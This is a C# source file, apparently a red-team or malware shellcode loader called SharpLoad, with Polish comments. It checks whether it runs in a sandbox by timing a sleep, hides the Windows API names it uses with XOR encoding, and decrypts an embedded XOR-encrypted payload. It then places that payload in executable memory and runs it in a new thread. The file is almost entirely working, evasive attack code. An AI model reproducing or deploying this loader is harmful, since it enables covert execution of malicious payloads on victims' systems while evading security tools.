using System;
using System.Collections.ObjectModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;

namespace SharpLoad
{
    [ComVisible(true)]
    public class Load
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr aaaaaaaaaaaa(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate IntPtr bbbbbbbbbbbbb(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate UInt32 ccccccccccccccc(IntPtr hHandle, UInt32 dwMilliseconds);

  
        // ponizej funkcja ktora sprawdza czy jestesmy w sandboxie. Czesto sandboxy jak widzą sleepy to robia fast-forward do kolejnego kroku. Robimy wiec sleep 2 sekundy, sprawdzamy czy rzeczywiscie minely 2 sekundy (sprawdzajac timeofday) 

        public static void amireal()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }
            else
            {
                Execute();
            }
        }

        public static byte[] helloworld(byte[] e_buf, string key)
        {
            byte[] d_buf = new byte[e_buf.Length];
            byte[] key_bytes = Encoding.UTF8.GetBytes(key);

            for (int i =0; i < e_buf.Length; i++)
            {
                d_buf[i] = (byte)(e_buf[i] ^ key_bytes[i % key_bytes.Length]);
            }

            return d_buf;
        }


        public static void Execute()
        {
            Console.WriteLine("Testowy napis");

            byte[] buf = new byte[581] {0x8f,0x21,0xe6,0x89,0x91,0x86,
0xa7,0x6f,0x73,0x69,0x24,0x3c,0x20,0x3e,0x39,0x3e,0x25,0x21,
0x54,0xbf,0x04,0x26,0xe0,0x3d,0x13,0x21,0xee,0x3f,0x79,0x26,
0xe0,0x3d,0x53,0x21,0x6a,0xda,0x2b,0x24,0x26,0x5e,0xba,0x21,
 ... ,
0x9a,0xb8,0x29,0xed,0xaf,0x4f,0xf6,0xa9,0x11,0xdf,0x07,0xe5,
0x6c,0x27,0x72,0xaa,0xe0,0xad,0x14,0xbc,0x33,0xac,0x2b,0x03,
0x65,0x34,0x28,0xa9,0xa9,0x9f,0xc6,0xcb,0x33,0x92,0xb4};


            // Xor payload with one byte key
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            //}



            byte[] d_buf = helloworld(buf, "siemanko");


            byte[] e_dl = { 0x91, 0x9f, 0x88, 0x94, 0x9f, 0x96, 0xc9, 0xc8, 0xd4, 0x9e, 0x96, 0x96 };
            byte[] d_dl = new byte[12];
            for (int i = 0; i < e_dl.Length; i++)
            {
                d_dl[i] = (byte)((uint)e_dl[i] ^ 0xfa);
            }
            var v1 = Encoding.Default.GetString(d_dl);
            string dname2 = v1;

            IntPtr hModule2 = LoadLibrary(dname2);
            byte[] e_va = { 0xac, 0x93, 0x88, 0x8e, 0x8f, 0x9b, 0x96, 0xbb, 0x96, 0x96, 0x95, 0x99 };
            byte[] d_va = new byte[12];
            for (int i = 0; i < e_va.Length; i++)
            {
                d_va[i] = (byte)((uint)e_va[i] ^ 0xfa);
            }
            var v2 = Encoding.Default.GetString(d_va);
            byte[] e_ct = { 0xb9, 0x88, 0x9f, 0x9b, 0x8e, 0x9f, 0xae, 0x92, 0x88, 0x9f, 0x9b, 0x9e };
            byte[] d_ct = new byte[12];
            for (int i = 0; i < e_ct.Length; i++)
            {
                d_ct[i] = (byte)((uint)e_ct[i] ^ 0xfa);
            }
            var v3 = Encoding.Default.GetString(d_ct);
            byte[] e_wf = { 0xad, 0x9b, 0x93, 0x8e, 0xbc, 0x95, 0x88, 0xa9, 0x93, 0x94, 0x9d, 0x96, 0x9f, 0xb5, 0x98, 0x90, 0x9f, 0x99, 0x8e };
            byte[] d_wf = new byte[19];
            for (int i = 0; i < e_wf.Length; i++)
            {
                d_wf[i] = (byte)((uint)e_wf[i] ^ 0xfa);
            }
            var v4 = Encoding.Default.GetString(d_wf);
            IntPtr intPtr2 = GetProcAddress(hModule2, (string)v2);
            aaaaaaaaaaaa va = (aaaaaaaaaaaa)Marshal.GetDelegateForFunctionPointer(intPtr2, typeof(aaaaaaaaaaaa));
            IntPtr addr = va(IntPtr.Zero, 0x7000, 0x3000, 0x40);
            int size = d_buf.Length;
            Marshal.Copy(d_buf, 0, addr, size);
            IntPtr intPtr3 = GetProcAddress(hModule2, (string)v3);
            bbbbbbbbbbbbb cr = (bbbbbbbbbbbbb)Marshal.GetDelegateForFunctionPointer(intPtr3, typeof(bbbbbbbbbbbbb));
            IntPtr hThread = cr(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            IntPtr intPtr4 = GetProcAddress(hModule2, (string)v4);
            ccccccccccccccc wf = (ccccccccccccccc)Marshal.GetDelegateForFunctionPointer(intPtr4, typeof(ccccccccccccccc));
            wf(hThread, 0xFFFFFFFF);
        }

        public static void Main()
        {
            
     ;
            amireal();

            string userName = Console.ReadLine();
        }
    }
}
